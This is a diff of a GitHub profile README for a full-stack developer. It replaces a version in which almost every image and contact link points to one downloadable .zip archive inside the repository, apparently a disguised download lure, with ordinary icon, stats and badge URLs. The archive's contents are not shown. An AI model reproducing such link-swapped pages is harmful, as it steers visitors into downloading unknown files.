@@ -1,173 +1,105 @@
 <div align="center">
-  <img width="100%" src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip,100:764ba2&height=200&section=header&text=Reuben%20Korsi%20Amuzu&fontSize=50&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Full%20Stack%20Developer%20|%20Software%20Engineer&descAlignY=55&descAlign=50" />
-  
-   #### Building scalable web applications and turning ideas into reality. 
-  
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip%20views&color=0e75b6&style=flat" alt="profile views" />
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=764ba2&height=200&section=header&text=Reuben%20Korsi%20Amuzu&fontSize=50&fontColor=ffffff&animation=fadeIn&fontAlignY=38&desc=Full%20Stack%20Developer%20|%20Software%20Engineer&descAlignY=55" />
 
+#### Building scalable web applications and turning ideas into reality.
+
+  <img src="https://komarev.com/ghpvc/?username=Amson-tECH&color=0e75b6&style=flat" alt="profile views" />
 </div>
 
-
-
-
-
 <div align="center">
-  <!-- <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" width="400"> -->
-  <img align="center" alt="Coding" width="400" src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip">
+  <img src="https://media.giphy.com/media/qgQUggAC3Pfv687qPC/giphy.gif" width="400" alt="coding" />
 </div>
 
 ---
 
 <div align="center">
-  
-  ### 🛠️ Tech Stack
-  
-  <br>
-  
-  **Frontend**
-  
-  <p>
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="html5" title="HTML5" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="css3" title="CSS3" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="javascript" title="JavaScript" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="typescript" title="TypeScript" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="react" title="React" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="tailwind" title="Tailwind CSS" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="65" alt="expo" title="Expo" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="expo" title="Expo" />
-  </p>
-  
-  **Backend**
-  
-  <p>
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="nodejs" title="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="express" title="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="python" title="Python" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="cpp" title="C++" />
-    
-  </p>
-  
-  **Database**
-  
-  <p>
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="mongodb" title="MongoDB" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="mongoose" title="Mongoose" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="cpp" title="Prisma" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="postgresql" title="Postgresql" />
-  </p>
-  
-  **Tools & Technologies**
-  
-  <p>
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="git" title="Git" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="github" title="GitHub" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="docker" title="Docker" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="linux" title="Linux" />
-    <img width="15" />
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" height="45" alt="vscode" title="VS Code" />
-  </p>
-  
+
+### 🛠️ Tech Stack
+
+**Frontend**
+
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/css3/css3-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/javascript/javascript-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/typescript/typescript-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/react/react-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/nextjs/nextjs-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/tailwindcss/tailwindcss-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/expo/expo-original.svg" height="45" />
+
+**Backend**
+
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/nodejs/nodejs-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/express/express-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/python/python-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/cplusplus/cplusplus-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/java/java-original.svg" height="45" />
+
+**Database**
+
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mongodb/mongodb-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mongoose/mongoose-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/postgresql/postgresql-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/prisma/prisma-original.svg" height="45" />
+
+**Tools & Technologies**
+
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/git/git-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/github/github-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/docker/docker-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/vscode/vscode-original.svg" height="45" />
+<img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/postman/postman-original.svg" height="45" />
+
 </div>
 
 ---
 
 <div align="center">
-  
-  ### 📊 GitHub Statistics
-  
-  <br>
-  
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="GitHub Stats" height="180" />
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="Top Languages" height="180" />
-  
-  <br><br>
-  
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="GitHub Streak" />
-  
-  <br><br>
-  
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="GitHub Trophies" />
-  
+
+### 📊 GitHub Statistics
+
+<img src="https://github-readme-stats.vercel.app/api?username=Amson-tECH&show_icons=true&theme=tokyonight" height="180" />
+<img src="https://github-readme-stats.vercel.app/api/top-langs/?username=Amson-tECH&layout=compact&theme=tokyonight" height="180" />
+
+<img src="https://github-readme-streak-stats.herokuapp.com/?user=Amson-tECH&theme=tokyonight" />
+
+<img src="https://github-profile-trophy.vercel.app/?username=Amson-tECH&theme=darkhub&row=1" />
+
 </div>
 
 ---
 
 <div align="center">
-  
-  ### 🎵 Currently Vibing To
-  
-  <br>
-  
-  <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip">
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="Spotify Recently Played"/>
-  </a>
-  
+
+### 🤝 Let's Connect!
+
+<a href="https://www.linkedin.com" target="_blank">
+  <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" />
+</a>
+<a href="https://twitter.com" target="_blank">
+  <img src="https://img.shields.io/badge/Twitter-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white" />
+</a>
+<a href="https://github.com/Amson-tECH" target="_blank">
+  <img src="https://img.shields.io/badge/GitHub-181717?style=for-the-badge&logo=github&logoColor=white" />
+</a>
+
 </div>
 
 ---
 
 <div align="center">
-  
-  ### 🤝 Let's Connect!
-  
-  <p align="center">
-    <em>Feel free to reach out for collaborations, opportunities, or just a chat!</em>
-  </p>
-  
-  <br>
-  
-  <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" target="_blank">
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="LinkedIn" />
-  </a>
-  <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" target="_blank">
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="Twitter" />
-  </a>
-  <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" target="_blank">
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="YouTube" />
-  </a>
-  <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip%20Mr.%20Reuben%2C%20I%27m%20interested%20in%20your%20work!" target="_blank">
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="WhatsApp" />
-  </a>
-  <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip%3D%3D&utm_source=qr" target="_blank">
-    <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="Instagram" />
-  </a>
-  
+
+### 💡 Quote of the Day
+
+<img src="https://quotes-github-readme.vercel.app/api?type=horizontal&theme=tokyonight" />
+
 </div>
 
 ---
 
 <div align="center">
-  
-  ### 💡 Quote of the Day!
-  
-  <br>
-  
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip" alt="Random Dev Quote"/>
-  
+  <img src="https://capsule-render.vercel.app/api?type=waving&color=764ba2&height=100&section=footer" />
+  <em>⭐️ From Reuben Korsi Amuzu with ❤️</em>
 </div>
 
----
-
-<div align="center">
-  
-  <img src="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip,100:764ba2&height=100&section=footer" />
-  
-  <p align="center">
-    <em>⭐️ From <a href="https://github.com/Amson-tECH/Amson-tECH/raw/refs/heads/main/metaphenomenon/t_Amson_ECH_3.7-beta.3.zip">Reuben Korsi Amuzu</a> with ❤️</em>
-  </p>
-  
-</div>
